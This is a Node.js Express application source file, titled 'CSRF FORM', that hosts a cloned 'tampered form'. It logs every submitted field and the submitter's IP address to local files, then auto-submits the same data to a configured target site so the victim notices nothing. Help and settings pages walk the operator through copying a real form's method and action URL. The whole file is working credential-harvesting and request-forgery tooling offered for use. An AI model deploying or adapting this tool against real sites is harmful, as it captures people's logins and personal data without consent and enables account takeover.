const fs = require('fs');

const express = require('express');
const escape = require('escape-html');

let settings = require('./settings.json');
let seq = 0;

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const port = parseInt(settings.port);

app.get('/style.css', (req, res) => {
    res.send(`
    * {
        background-color: black;
        color: white;
        font-family: monospace;
        font-size: 18pt;
    }

    a {
        color: yellow;
        background-color: black;
        text-decoration: none;
    }

    a:hover {
        color: black;
        background-color: yellow;
    }

    input {
        margin: 0;
        padding: 0;
        border-width: 0;
    }

    input[type='text'], input[type='password'], input[type='number'] {
        background-color: white;
        color: black;
    }

    input[type='button'], input[type='submit'] {
        background-color: blue;
        color: white;
    }

    .code {
        background-color: #808080;
    }

    .highlight {
        color: black;
        background-color: c0c0c0;
    }
    `);
});

app.get('/', (req, res) => {
    res.send(`
    <html>
    <head>
    <link rel="stylesheet" href="style.css" />
    <script>
    function openStaticFolder() {
        fetch('/open', { method: "POST" });
    }
    </script>
    </head>
    <body>
    #################
    <br/>
    ### <b>CSRF FORM</b> ###
    <br />
    #################
    <br />
    <br />
    <br />
    <br />
    &nbsp;&nbsp;1. Click <b><a href="/help">here</a></b> to see instructions on how to use this app.
    <br />
    <br />
    &nbsp;&nbsp;2. Click <b><a href="/settings">here</a></b> to edit the settings of this app.
    <br />
    <br />
    &nbsp;&nbsp;3. Click <b><a href="/url-tool">here</a></b> to access the URL conversion tool.
    <br />
    <br />
    &nbsp;&nbsp;4. Click <b><a href="javascript:openStaticFolder();">here</a></b> to open the <span class="highlight">/static</span> folder.
    <br />
    <br />
    &nbsp;&nbsp;5. Click <b><a href="/site">here</a></b> to see your CSRF form.
    </body>
    </html>
    `);
});

let mayOpen = true;

app.post('/open', (req, res) => {
    if (mayOpen) {
        mayOpen = false;
        setTimeout(() => {
            mayOpen = true;
        }, 5000);

        const platform = require(`os`).platform().toLowerCase().replace(/[0-9]/g, ``).replace(`darwin`, `macos`);
        let path = require('path').join(__dirname, 'static');
        let cmd;
        switch (platform) {
            case `win`:
                cmd = `explorer`;
                break;
            case `linux`:
                cmd = `xdg-open`;
                break;
            case `macos`:
                cmd = `open`;
                break;
        }
        let p = require(`child_process`).spawn(cmd, [path]);
        p.on('error', (err) => {
            p.kill();
        });
    }
    res.send("");
});

app.get('/help', (req, res) => {
    res.send(`
    <html>
    <head>
    <link rel="stylesheet" href="style.css" />
    <script>
    function openStaticFolder() {
        fetch('/open', { method: "POST" });
    }
    </script>
    </head>
    <body>
    ########################
    <br/>
    ### CSRF FORM / <b>HELP</b> ###
    <br />
    ########################
    <br />
    Click <a href="/">here</a> to return to the main page.
    <br />
    <br />
    <br />
    This app allows you to create a tampered form that:
    <br />
    &nbsp;&nbsp;1. Logs all submitted data.
    <br />
    &nbsp;&nbsp;2. Submits all data to another web application (efectively doing a CSRF - Cross-site Request Forgery).
    <br />
    <br />
    In order to do that, you must first inspect the HTML source of the form you are going to tamper. Find the <span class="code">&lt;form&gt;</span> tag and check out the following attributes:
    <br />
    <br />
    <div class="code">
    &nbsp;
    <br />
    &nbsp;&nbsp;&nbsp;&nbsp;&lt;form method=<span class="highlight">"POST"</span> action=<span class="highlight">"/foo/bar"</span>&gt;
    <br />
    &nbsp;
    </div>
    <br />
    <br />
    The <b>method</b> attribute indicates whether the form is submitted using HTTP GET or HTTP POST. Your tampered form must use the same HTTP method as the original form. <u>The HTTP method must be configured in the <a href="/settings">settings</a></u>.
    <br />
    <br />
    The <b>action</b> attribute indicates the URL where the form is submitted to. You must convert this to an <a href="https://datatracker.ietf.org/doc/html/rfc3986#section-4.3">absolute URL</a>. You may use the <a href="/url-tool">URL conversion tool</a> to convert it <s>if you are too lazy do do it by hand</s>. <u>The absolute URL must be configured in the <a href="/settings">settings</a></u>.
    <br />
    <br />
    <br />
    You must create the tampered form in the <b><u>static</u></b> folder in the project. Click <a href="javascript:openStaticFolder();">here</a> to open it. Everything in that folder is accessible within the <a href="/site">/site</a> path.
    <br />
    <br />
    Make sure to set the <span class="highlight">action</span> attribute of your form to <span class="highlight">"/target"</span>. Also make sure to add all the required <span class="highlight">&lt;input&gt;</span> fields in the form.
    </body>
    </html>
    `);
});


app.get('/url-tool', (req, res) => {
    res.send(`
    <html>
    <head>
    <link rel="stylesheet" href="style.css" />
    <script>
    function convert() {
        var input1 = document.getElementById('formUrl');
        var input2 = document.getElementById('formAction');
        var span = document.getElementById('output');

        try {
            span.innerHTML = 'The absolute URL is <span class="highlight">' + new URL(input2.value, input1.value).href + '</span>';
        } catch (e) {
            span.innerHTML = '!!! Something went wrong !!!';
        }
    }
    </script>
    </head>
    <body>
    ############################
    <br/>
    ### CSRF FORM / <b>URL-TOOL</b> ###
    <br />
    ############################
    <br />
    Click <a href="/">here</a> to return to the main page.
    <br />
    <br />
    <br />
    This is a tool to convert the form URL and its action to an absolute URL. If you don't know why this is here, read the <a href="/help">help page</a>.
    <br />
    <br />
    Form URL:&nbsp;&nbsp;&nbsp;&nbsp;<input id="formUrl" type="text" size="60" />
    <br />
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This is the URL where the original form is located.
    <br />
    <br />
    Form action:&nbsp;<input id="formAction" type="text" size="60" />
    <br />
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This is the <span class="highlight">action</span> of the original form.
    <br />
    <br />
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="button" value=" Convert " onclick="convert();" />
    <br />
    <br />
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span id="output"><span>
    </body>
    </html>
    `);
});

app.get('/settings', (req, res) => {
    renderSettings(req, res);
});

app.post('/settings', (req, res) => {
    settings = req.body;

    fs.writeFileSync('./settings.json', JSON.stringify(settings, null, 4));

    renderSettings(req, res);
});

app.get('/site', (req, res) => {
    res.redirect('/site/index.html');
});

app.post('/target', (req, res) => {
    handleForm(req, res);
});

app.get('/target', (req, res) => {
    handleForm(req, res);
});

app.use('/site', express.static('./static'));

app.listen(port, () => {
    console.log(`CSRF form app listening on port ${port}`)
});

function renderSettings(req, res) {
    let saved = '';
    if (req.method == "POST") {
        saved = `&nbsp;&nbsp;<span id="message" class="highlight">The settings have been saved!</span>`
    }

    res.send(`
    <html>
    <head>
    <link rel="stylesheet" href="style.css" />
    <script>
    function hideMessageLater() {
        let span = document.getElementById('message');
        if (span) {
            setTimeout(function () {
                span.innerText = '';
            }, 5000);
        }
    }
    </script>
    </head>
    <body onload="hideMessageLater();">
    ############################
    <br/>
    ### CSRF FORM / <b>SETTINGS</b> ###
    <br />
    ############################
    <br />
    Click <a href="/">here</a> to return to the main page.
    <br />
    <br />
    ${saved}
    <br />
    This is a page where you can edit the system settings. If you don't know what to do here, read the <a href="/help">help page</a>.
    <br />
    <br />
    <form action="settings" method="POST">
    Target:&nbsp;<input type="text" value="${escape(settings.targetUrl)}" name="targetUrl" size="60" />
    <br/>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This is the absolute URL of the <span class="highlight">action</span> attribute of the original <span class="highlight">&lt;form&gt;</span>.
    <br />
    <br />
    Method:&nbsp;<input type="radio" name="httpMethod" value="POST"${settings.httpMethod == "POST" ? " checked": ""} /> POST
    <br />
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="radio" name="httpMethod" value="GET"${settings.httpMethod == "GET" ? " checked": ""} /> GET
    </ul>
    <br/>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This is the <span class="highlight">method</span> attribute of the original <span class="highlight">&lt;form&gt;</span>.
    <br />
    <br />
    Port:&nbsp;&nbsp;&nbsp;<input type="number" value="${escape(settings.port)}" name="port" size="8" />
    <br/>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This is the port where this web server runs. You will need to restart the application for this to have effect.
    <br />
    <br />
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="submit" value=" Save " />
    </form>
    </body>
    </html>
    `);
}

function handleForm(req, res) {
    let params;
    if (req.method == 'GET') {
        params = req.query;
    } else {
        params = req.body;
    }

    let script = '';
    let text = '';
    let submit = '';
    if (req.method != settings.httpMethod) {
        text = `The "method" parameter of your &lt;form&gt; should be ${settings.httpMethod}! Fix that and this page will load automatically`;
        submit = `<input type="submit" value="Click here to continue" />`
    } else {
        script = `
        <script>
        function triggerForm() {
            document.getElementById('form').submit();
        }
        </script>`
    }

    const formInputs = Object.entries(params).map(([ key, value ]) => (
        `<input type="hidden" value="${escape(value)}" name="${escape(key)}" />`
    )).join('\n');

    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    let log = [
        `IP: ` + ip,
        '--------------------',
        ...Object.entries(params).map(([ key, value ]) => (
            `${key}: ${value}`
        ))
    ]

    try {
        let dir = require('path').join(__dirname, "logs");
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir);
        }
        fs.writeFileSync(require('path').join(dir, Date.now() + '_' + String(seq++).padStart(8, '0') + '.txt'), log.join('\n'));
    } catch (e) {}

    res.send(`
    <html>
    ${script}
    <body onload="triggerForm();">
    ${text}
    <form id="form" action="${settings.targetUrl}" method="${settings.httpMethod}">
    ${formInputs}
    ${submit}
    </form>
    </body>
    </html>
    `)
}
